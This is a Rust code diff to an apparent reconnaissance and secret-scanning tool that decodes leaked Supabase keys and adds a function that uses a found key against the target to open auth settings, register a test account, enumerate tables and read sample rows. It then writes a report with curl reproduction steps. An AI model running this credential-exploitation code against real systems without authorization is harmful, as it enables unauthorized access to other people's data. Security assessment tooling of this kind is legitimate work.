@@ -1067,6 +1067,7 @@ pub async fn scan_for_all_hardcoded_secrets(
     validate_tokens: bool,
 ) -> Vec<HardcodedSecret> {
     let mut secrets = Vec::new();
+    let mut supabase_jwt_keys: HashSet<String> = HashSet::new();
 
     // Start with the original enhanced scan
     let enhanced_secrets = scan_for_enhanced_secrets(content, source_url, client, validate_tokens).await;
@@ -1130,36 +1131,107 @@ pub async fn scan_for_all_hardcoded_secrets(
     add_simple_secret(&mut secrets, content, source_url, &RE_AZURE_CONNECTION_STRING, "AZURE_CONNECTION_STRING", "CRITICAL");
 
     // ═══════════════════════════════════════════════════════════════════
-    // SUPABASE
+    // SUPABASE - Full Detection with JWT Decode
     // ═══════════════════════════════════════════════════════════════════
-    add_simple_secret(&mut secrets, content, source_url, &RE_SUPABASE_URL, "SUPABASE_URL", "LOW");
-    // Note: Supabase anon keys are meant to be public, but service_role keys are critical
+    // Collect Supabase URL from same content for pairing
+    let supabase_url_in_content: Option<String> = RE_SUPABASE_URL.find(content).map(|m| m.as_str().to_string());
+    if let Some(ref supa_url) = supabase_url_in_content {
+        secrets.push(HardcodedSecret {
+            secret_type: "SUPABASE_URL".to_string(),
+            secret_value: supa_url.clone(),
+            secret_preview: supa_url.clone(),
+            found_in_url: source_url.to_string(),
+            js_source_url: Some(source_url.to_string()),
+            context: format!("Supabase project URL found: {}", supa_url),
+            severity: "INFO".to_string(),
+            validated: false,
+            validation_status: "URL_DETECTED".to_string(),
+            discovered_at: Utc::now().to_rfc3339(),
+            code_snippet: None,
+            has_code_context: None,
+            line_number: None,
+            remediation: None,
+        });
+    }
+
     for mat in RE_SUPABASE_KEY.find_iter(content) {
         let key_str = mat.as_str();
-        // Try to determine if it's anon or service_role key
         let context = extract_context(content, mat.start(), mat.end(), 100);
-        let is_service_role = context.to_lowercase().contains("service_role") ||
-                              context.to_lowercase().contains("service-role") ||
-                              context.to_lowercase().contains("servicerole");
 
-        if is_service_role {
-            secrets.push(HardcodedSecret {
-                secret_type: "SUPABASE_SERVICE_ROLE_KEY".to_string(),
-                secret_value: "***REDACTED***".to_string(),
-                secret_preview: create_safe_preview(key_str),
-                found_in_url: source_url.to_string(),
-                js_source_url: Some(source_url.to_string()),
-                context: context.clone(),
-                severity: "CRITICAL".to_string(),
-                validated: false,
-                validation_status: "SERVICE_ROLE_KEY_DETECTED".to_string(),
-                discovered_at: Utc::now().to_rfc3339(),
-                code_snippet: None,
-                has_code_context: None,
-                line_number: None,
-                remediation: Some("Service role keys should NEVER be exposed in frontend code!".to_string()),
-            });
-        }
+        // Decode JWT payload to determine role
+        let role = decode_supabase_jwt_role(key_str);
+        let is_supabase = role.is_some();
+
+        let (secret_type, severity, status, remediation_text) = match role.as_deref() {
+            Some("service_role") => (
+                "SUPABASE_SERVICE_ROLE_KEY".to_string(),
+                "CRITICAL".to_string(),
+                "SERVICE_ROLE_KEY_DECODED".to_string(),
+                "CRITICAL: service_role key exposed in frontend JS! This key bypasses Row Level Security (RLS) and has FULL database access. Remove immediately and rotate the key in Supabase Dashboard > Settings > API.",
+            ),
+            Some("anon") => (
+                "SUPABASE_ANON_KEY".to_string(),
+                "HIGH".to_string(),
+                "ANON_KEY_DECODED".to_string(),
+                "Supabase anon key exposed in JS. While designed for client use, verify RLS policies are enforced. Test for: user signup abuse, data enumeration, missing RLS on tables.",
+            ),
+            Some(other_role) => (
+                format!("SUPABASE_{}_KEY", other_role.to_uppercase()),
+                "HIGH".to_string(),
+                format!("ROLE_{}_DECODED", other_role.to_uppercase()),
+                "Supabase key with custom role exposed. Verify permissions and RLS policies.",
+            ),
+            None => {
+                // Fallback: check context for role hints
+                let ctx_lower = context.to_lowercase();
+                if ctx_lower.contains("service_role") || ctx_lower.contains("service-role") || ctx_lower.contains("servicerole") {
+                    (
+                        "SUPABASE_SERVICE_ROLE_KEY".to_string(),
+                        "CRITICAL".to_string(),
+                        "SERVICE_ROLE_CONTEXT_MATCH".to_string(),
+                        "CRITICAL: service_role key exposed in frontend JS!",
+                    )
+                } else if ctx_lower.contains("supabase") || ctx_lower.contains("anon") {
+                    (
+                        "SUPABASE_ANON_KEY".to_string(),
+                        "HIGH".to_string(),
+                        "ANON_KEY_CONTEXT_MATCH".to_string(),
+                        "Supabase anon key exposed in JS. Verify RLS policies.",
+                    )
+                } else {
+                    // Not clearly Supabase, skip - will be caught by generic JWT
+                    continue;
+                }
+            }
+        };
+
+        // Track this key as Supabase so generic JWT scanner skips it
+        supabase_jwt_keys.insert(key_str.to_string());
+
+        secrets.push(HardcodedSecret {
+            secret_type,
+            secret_value: key_str.to_string(), // Store full key for validation later
+            secret_preview: create_safe_preview(key_str),
+            found_in_url: source_url.to_string(),
+            js_source_url: Some(source_url.to_string()),
+            context: if is_supabase {
+                if let Some(ref supa_url) = supabase_url_in_content {
+                    format!("{} | Supabase URL: {}", context, supa_url)
+                } else {
+                    context
+                }
+            } else {
+                context
+            },
+            severity,
+            validated: false,
+            validation_status: status,
+            discovered_at: Utc::now().to_rfc3339(),
+            code_snippet: None,
+            has_code_context: None,
+            line_number: None,
+            remediation: Some(remediation_text.to_string()),
+        });
     }
 
     // ═══════════════════════════════════════════════════════════════════
@@ -1197,6 +1269,12 @@ pub async fn scan_for_all_hardcoded_secrets(
     // JWT tokens (might be session tokens exposed in code)
     for mat in RE_JWT_TOKEN.find_iter(content) {
         let token = mat.as_str();
+
+        // Skip tokens already identified as Supabase keys
+        if supabase_jwt_keys.contains(token) {
+            continue;
+        }
+
         let context = extract_context(content, mat.start(), mat.end(), 50);
 
         // Check if this looks like a hardcoded token vs. just JWT format reference
@@ -1706,4 +1784,448 @@ pub fn display_cloud_storage_summary(exposures: &[CloudStorageExposure]) {
     }
 
     println!("\n{}", "═══════════════════════════════════════════════════════".cyan().bold());
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// SUPABASE JWT DECODING & EXPLOITATION
+// ═══════════════════════════════════════════════════════════════════
+
+/// Decode Supabase JWT payload to extract role (anon, service_role, etc.)
+pub fn decode_supabase_jwt_role(jwt: &str) -> Option<String> {
+    let parts: Vec<&str> = jwt.split('.').collect();
+    if parts.len() != 3 {
+        return None;
+    }
+
+    // Decode payload (second part) with base64 URL-safe no-pad
+    use base64::Engine;
+    let engine = base64::engine::general_purpose::URL_SAFE_NO_PAD;
+    let payload_bytes = engine.decode(parts[1]).ok()?;
+    let payload_str = String::from_utf8(payload_bytes).ok()?;
+    let payload: serde_json::Value = serde_json::from_str(&payload_str).ok()?;
+
+    // Check if this is a Supabase JWT (iss == "supabase")
+    let issuer = payload.get("iss").and_then(|v| v.as_str()).unwrap_or("");
+    if issuer != "supabase" {
+        return None;
+    }
+
+    payload.get("role").and_then(|v| v.as_str()).map(|s| s.to_string())
+}
+
+/// Full Supabase JWT payload decode for reporting
+pub fn decode_supabase_jwt_full(jwt: &str) -> Option<serde_json::Value> {
+    let parts: Vec<&str> = jwt.split('.').collect();
+    if parts.len() != 3 {
+        return None;
+    }
+
+    use base64::Engine;
+    let engine = base64::engine::general_purpose::URL_SAFE_NO_PAD;
+    let payload_bytes = engine.decode(parts[1]).ok()?;
+    let payload_str = String::from_utf8(payload_bytes).ok()?;
+    serde_json::from_str(&payload_str).ok()
+}
+
+/// Results from Supabase exploitation tests
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SupabaseExploitResult {
+    pub supabase_url: String,
+    pub key_type: String,   // "anon" or "service_role"
+    pub key_preview: String,
+    pub source_js_url: String,
+
+    // Auth tests
+    pub signup_enabled: bool,
+    pub signup_response: String,
+    pub auth_settings: Option<serde_json::Value>,
+
+    // Database tests
+    pub tables_accessible: Vec<String>,
+    pub tables_response: String,
+    pub sample_data: Vec<(String, String)>, // (table_name, first_row_preview)
+
+    // Connection test
+    pub rest_api_accessible: bool,
+    pub rest_api_response: String,
+
+    // Overall
+    pub severity: String,
+    pub findings: Vec<String>,
+}
+
+/// Validate and exploit Supabase key - test signup, tables, data access
+pub async fn validate_supabase_key(
+    supabase_url: &str,
+    api_key: &str,
+    key_type: &str,
+    source_url: &str,
+    client: &Client,
+) -> SupabaseExploitResult {
+    let mut result = SupabaseExploitResult {
+        supabase_url: supabase_url.to_string(),
+        key_type: key_type.to_string(),
+        key_preview: create_safe_preview(api_key),
+        source_js_url: source_url.to_string(),
+        signup_enabled: false,
+        signup_response: String::new(),
+        auth_settings: None,
+        tables_accessible: Vec::new(),
+        tables_response: String::new(),
+        sample_data: Vec::new(),
+        rest_api_accessible: false,
+        rest_api_response: String::new(),
+        severity: "HIGH".to_string(),
+        findings: Vec::new(),
+    };
+
+    let timeout = Duration::from_secs(15);
+
+    // ═══════════════════════════════════════════════════════════════
+    // TEST 1: Auth Settings (GET /auth/v1/settings)
+    // ═══════════════════════════════════════════════════════════════
+    let settings_url = format!("{}/auth/v1/settings", supabase_url);
+    match client
+        .get(&settings_url)
+        .header("apikey", api_key)
+        .header("Authorization", format!("Bearer {}", api_key))
+        .timeout(timeout)
+        .send()
+        .await
+    {
+        Ok(resp) => {
+            let status = resp.status();
+            if status.is_success() {
+                if let Ok(json) = resp.json::<serde_json::Value>().await {
+                    result.auth_settings = Some(json.clone());
+                    result.findings.push("Auth settings endpoint accessible".to_string());
+
+                    // Check enabled auth providers
+                    if let Some(external) = json.get("external") {
+                        let mut providers = Vec::new();
+                        if let Some(obj) = external.as_object() {
+                            for (provider, config) in obj {
+                                if config.get("enabled").and_then(|v| v.as_bool()).unwrap_or(false) {
+                                    providers.push(provider.clone());
+                                }
+                            }
+                        }
+                        if !providers.is_empty() {
+                            result.findings.push(format!("Auth providers enabled: {}", providers.join(", ")));
+                        }
+                    }
+                }
+            }
+        }
+        Err(_) => {}
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // TEST 2: User Signup (POST /auth/v1/signup)
+    // ═══════════════════════════════════════════════════════════════
+    let signup_url = format!("{}/auth/v1/signup", supabase_url);
+    let test_email = format!("enumrust_test_{}@test.invalid", chrono::Utc::now().timestamp());
+    let signup_body = serde_json::json!({
+        "email": test_email,
+        "password": "EnumRustTestP@ss123!"
+    });
+
+    match client
+        .post(&signup_url)
+        .header("apikey", api_key)
+        .header("Authorization", format!("Bearer {}", api_key))
+        .header("Content-Type", "application/json")
+        .json(&signup_body)
+        .timeout(timeout)
+        .send()
+        .await
+    {
+        Ok(resp) => {
+            let status = resp.status();
+            let body = resp.text().await.unwrap_or_default();
+            result.signup_response = format!("HTTP {} | {}", status.as_u16(), truncate_string(&body, 500));
+
+            if status.is_success() || status.as_u16() == 200 || status.as_u16() == 201 {
+                result.signup_enabled = true;
+                result.severity = "CRITICAL".to_string();
+                result.findings.push("USER SIGNUP IS OPEN - anyone can create accounts!".to_string());
+            } else if status.as_u16() == 422 {
+                // Usually means signup is enabled but email validation failed
+                if body.contains("already registered") || body.contains("already_exists") {
+                    result.signup_enabled = true;
+                    result.findings.push("Signup endpoint active (email already exists response)".to_string());
+                } else {
+                    result.findings.push(format!("Signup returned 422: {}", truncate_string(&body, 200)));
+                }
+            } else if status.as_u16() == 429 {
+                result.findings.push("Signup rate-limited (endpoint exists)".to_string());
+            } else if body.contains("Signups not allowed") || body.contains("signup_disabled") {
+                result.findings.push("Signup is disabled (good)".to_string());
+            }
+        }
+        Err(e) => {
+            result.signup_response = format!("Error: {}", e);
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // TEST 3: REST API - List Tables (GET /rest/v1/)
+    // ═══════════════════════════════════════════════════════════════
+    let rest_url = format!("{}/rest/v1/", supabase_url);
+    match client
+        .get(&rest_url)
+        .header("apikey", api_key)
+        .header("Authorization", format!("Bearer {}", api_key))
+        .timeout(timeout)
+        .send()
+        .await
+    {
+        Ok(resp) => {
+            let status = resp.status();
+            let body = resp.text().await.unwrap_or_default();
+            result.rest_api_response = format!("HTTP {} | {}", status.as_u16(), truncate_string(&body, 500));
+
+            if status.is_success() {
+                result.rest_api_accessible = true;
+                result.findings.push("REST API accessible".to_string());
+
+                // Try to parse OpenAPI/Swagger response to extract table names
+                if let Ok(json) = serde_json::from_str::<serde_json::Value>(&body) {
+                    if let Some(paths) = json.get("paths").and_then(|p| p.as_object()) {
+                        for path in paths.keys() {
+                            let table_name = path.trim_start_matches('/');
+                            if !table_name.is_empty() && !table_name.starts_with("rpc/") {
+                                result.tables_accessible.push(table_name.to_string());
+                            }
+                        }
+                    }
+                    // Also try definitions/schemas
+                    if let Some(defs) = json.get("definitions").and_then(|d| d.as_object()) {
+                        for table_name in defs.keys() {
+                            if !result.tables_accessible.contains(table_name) {
+                                result.tables_accessible.push(table_name.clone());
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        Err(e) => {
+            result.rest_api_response = format!("Error: {}", e);
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // TEST 4: Try Reading Data from Discovered Tables
+    // ═══════════════════════════════════════════════════════════════
+    let tables_to_test: Vec<String> = result.tables_accessible.iter().take(10).cloned().collect();
+    for table in &tables_to_test {
+        let table_url = format!("{}/rest/v1/{}?select=*&limit=1", supabase_url, table);
+        match client
+            .get(&table_url)
+            .header("apikey", api_key)
+            .header("Authorization", format!("Bearer {}", api_key))
+            .timeout(timeout)
+            .send()
+            .await
+        {
+            Ok(resp) => {
+                let status = resp.status();
+                if status.is_success() {
+                    let body = resp.text().await.unwrap_or_default();
+                    if !body.is_empty() && body != "[]" {
+                        result.sample_data.push((table.clone(), truncate_string(&body, 300)));
+                        result.findings.push(format!("Table '{}' readable - data exposed!", table));
+                    } else {
+                        result.findings.push(format!("Table '{}' accessible (empty or no data)", table));
+                    }
+                } else if status.as_u16() == 401 || status.as_u16() == 403 {
+                    // RLS is blocking - this is good
+                } else {
+                    result.findings.push(format!("Table '{}' returned HTTP {}", table, status.as_u16()));
+                }
+            }
+            Err(_) => {}
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // Determine final severity
+    // ═══════════════════════════════════════════════════════════════
+    if key_type == "service_role" {
+        result.severity = "CRITICAL".to_string();
+        result.findings.insert(0, "SERVICE_ROLE KEY EXPOSED - bypasses ALL Row Level Security!".to_string());
+    } else if result.signup_enabled && !result.sample_data.is_empty() {
+        result.severity = "CRITICAL".to_string();
+    } else if result.signup_enabled || !result.tables_accessible.is_empty() {
+        result.severity = "HIGH".to_string();
+    }
+
+    result
+}
+
+/// Truncate string helper
+fn truncate_string(s: &str, max_len: usize) -> String {
+    if s.len() <= max_len {
+        s.to_string()
+    } else {
+        format!("{}...", &s[..max_len])
+    }
+}
+
+/// Generate Supabase vulnerability report markdown
+pub fn generate_supabase_report(
+    domain: &str,
+    results: &[SupabaseExploitResult],
+    ollama_analysis: Option<&str>,
+    output_path: &Path,
+) -> anyhow::Result<()> {
+    if results.is_empty() {
+        return Ok(());
+    }
+
+    let mut report = String::new();
+
+    report.push_str(&format!("# Supabase Vulnerability Report - {}\n\n", domain));
+    report.push_str(&format!("**Scan Date:** {}\n", chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")));
+    report.push_str(&format!("**Target:** {}\n", domain));
+    report.push_str(&format!("**Findings:** {} Supabase instance(s) with exposed keys\n\n", results.len()));
+
+    // Executive Summary
+    report.push_str("## Executive Summary\n\n");
+    let critical_count = results.iter().filter(|r| r.severity == "CRITICAL").count();
+    let high_count = results.iter().filter(|r| r.severity == "HIGH").count();
+    let signup_count = results.iter().filter(|r| r.signup_enabled).count();
+    let data_exposed = results.iter().any(|r| !r.sample_data.is_empty());
+    let service_role_count = results.iter().filter(|r| r.key_type == "service_role").count();
+
+    if service_role_count > 0 {
+        report.push_str("**CRITICAL: Service role key(s) exposed in frontend JavaScript!** ");
+        report.push_str("This grants full database access bypassing all Row Level Security (RLS) policies.\n\n");
+    }
+    if signup_count > 0 {
+        report.push_str(&format!("**{} instance(s)** have open user signup - anyone can create accounts.\n\n", signup_count));
+    }
+    if data_exposed {
+        report.push_str("**Database tables with data exposed** to the discovered keys.\n\n");
+    }
+
+    report.push_str(&format!("| Severity | Count |\n|----------|-------|\n| Critical | {} |\n| High | {} |\n\n", critical_count, high_count));
+
+    // AI Analysis
+    if let Some(ai) = ollama_analysis {
+        report.push_str("## AI Analysis (Ollama)\n\n");
+        report.push_str(ai);
+        report.push_str("\n\n");
+    }
+
+    // Detailed Findings
+    for (idx, result) in results.iter().enumerate() {
+        report.push_str(&format!("---\n\n## Finding #{}: {} Key Exposed\n\n", idx + 1, result.key_type.to_uppercase()));
+        report.push_str(&format!("- **Severity:** {}\n", result.severity));
+        report.push_str(&format!("- **Supabase URL:** `{}`\n", result.supabase_url));
+        report.push_str(&format!("- **Key Type:** `{}`\n", result.key_type));
+        report.push_str(&format!("- **Key Preview:** `{}`\n", result.key_preview));
+        report.push_str(&format!("- **Found In:** `{}`\n\n", result.source_js_url));
+
+        // Vulnerability Description
+        report.push_str("### Vulnerability Description\n\n");
+        if result.key_type == "service_role" {
+            report.push_str("A **Supabase service_role key** was found hardcoded in a JavaScript file served to the browser. ");
+            report.push_str("This key has **FULL administrative access** to the Supabase project and **bypasses all Row Level Security (RLS)** policies. ");
+            report.push_str("An attacker can use this key to:\n\n");
+            report.push_str("- Read, modify, and delete ALL data in ALL tables\n");
+            report.push_str("- Create and manage user accounts\n");
+            report.push_str("- Execute arbitrary database functions\n");
+            report.push_str("- Access storage buckets\n\n");
+        } else {
+            report.push_str("A **Supabase anon (anonymous) key** was found in a JavaScript file. ");
+            report.push_str("While this key is designed for client-side use, its exposure combined with misconfigured ");
+            report.push_str("Row Level Security (RLS) policies can lead to:\n\n");
+            report.push_str("- Unauthorized data access if tables lack RLS\n");
+            report.push_str("- User account creation (signup abuse)\n");
+            report.push_str("- Data enumeration through the REST API\n\n");
+        }
+
+        // Test Results
+        report.push_str("### Exploitation Results\n\n");
+
+        // Signup test
+        report.push_str("#### 1. User Signup Test\n\n");
+        if result.signup_enabled {
+            report.push_str("**VULNERABLE** - User signup is enabled!\n\n");
+        } else {
+            report.push_str("Signup is disabled or restricted.\n\n");
+        }
+        report.push_str(&format!("```\n{}\n```\n\n", result.signup_response));
+
+        // Tables
+        report.push_str("#### 2. Database Tables Discovered\n\n");
+        if result.tables_accessible.is_empty() {
+            report.push_str("No tables accessible via REST API.\n\n");
+        } else {
+            report.push_str(&format!("**{} table(s) discovered:**\n\n", result.tables_accessible.len()));
+            for table in &result.tables_accessible {
+                report.push_str(&format!("- `{}`\n", table));
+            }
+            report.push_str("\n");
+        }
+
+        // Data samples
+        if !result.sample_data.is_empty() {
+            report.push_str("#### 3. Data Exposed\n\n");
+            report.push_str("**WARNING: Real data was accessible!**\n\n");
+            for (table, sample) in &result.sample_data {
+                report.push_str(&format!("**Table: `{}`**\n```json\n{}\n```\n\n", table, sample));
+            }
+        }
+
+        // Auth settings
+        if let Some(ref settings) = result.auth_settings {
+            report.push_str("#### 4. Auth Configuration\n\n");
+            report.push_str(&format!("```json\n{}\n```\n\n", serde_json::to_string_pretty(settings).unwrap_or_default()));
+        }
+
+        // All findings
+        report.push_str("### All Findings\n\n");
+        for finding in &result.findings {
+            report.push_str(&format!("- {}\n", finding));
+        }
+        report.push_str("\n");
+
+        // Step-by-step reproduction
+        report.push_str("### Step-by-Step Reproduction\n\n");
+        report.push_str(&format!("**Step 1:** Access the JavaScript file:\n```\ncurl -s '{}'\n```\n\n", result.source_js_url));
+        report.push_str(&format!("**Step 2:** Extract the Supabase URL and key from the JS source.\n\n"));
+        report.push_str(&format!("**Step 3:** Test auth settings:\n```bash\ncurl -s '{}/auth/v1/settings' \\\n  -H 'apikey: <SUPABASE_KEY>'\n```\n\n", result.supabase_url));
+        report.push_str(&format!("**Step 4:** Attempt user signup:\n```bash\ncurl -s -X POST '{}/auth/v1/signup' \\\n  -H 'apikey: <SUPABASE_KEY>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{{\"email\":\"test@example.com\",\"password\":\"TestPassword123!\"}}'\n```\n\n", result.supabase_url));
+        report.push_str(&format!("**Step 5:** List database tables:\n```bash\ncurl -s '{}/rest/v1/' \\\n  -H 'apikey: <SUPABASE_KEY>' \\\n  -H 'Authorization: Bearer <SUPABASE_KEY>'\n```\n\n", result.supabase_url));
+
+        if !result.tables_accessible.is_empty() {
+            let example_table = &result.tables_accessible[0];
+            report.push_str(&format!("**Step 6:** Read data from a table:\n```bash\ncurl -s '{}/rest/v1/{}?select=*&limit=10' \\\n  -H 'apikey: <SUPABASE_KEY>' \\\n  -H 'Authorization: Bearer <SUPABASE_KEY>'\n```\n\n", result.supabase_url, example_table));
+        }
+    }
+
+    // Remediation
+    report.push_str("---\n\n## Remediation\n\n");
+    report.push_str("### Immediate Actions\n\n");
+    report.push_str("1. **Rotate all exposed keys** in Supabase Dashboard > Settings > API\n");
+    report.push_str("2. **Remove keys from frontend JavaScript** - use server-side proxy instead\n");
+    report.push_str("3. **Enable Row Level Security (RLS)** on ALL tables\n");
+    report.push_str("4. **Disable signups** if not needed (Dashboard > Authentication > Settings)\n\n");
+    report.push_str("### Long-term Fixes\n\n");
+    report.push_str("1. Use **environment variables** for API keys in build process\n");
+    report.push_str("2. Implement **server-side API routes** that proxy Supabase requests\n");
+    report.push_str("3. Configure **RLS policies** for every table with specific access rules\n");
+    report.push_str("4. Enable **MFA** for admin accounts\n");
+    report.push_str("5. Set up **audit logging** to detect unauthorized access\n\n");
+
+    report.push_str("---\n\n*Report generated by EnumRust v2.3.0*\n");
+
+    // Write report
+    let mut file = File::create(output_path)?;
+    file.write_all(report.as_bytes())?;
+
+    Ok(())
 }
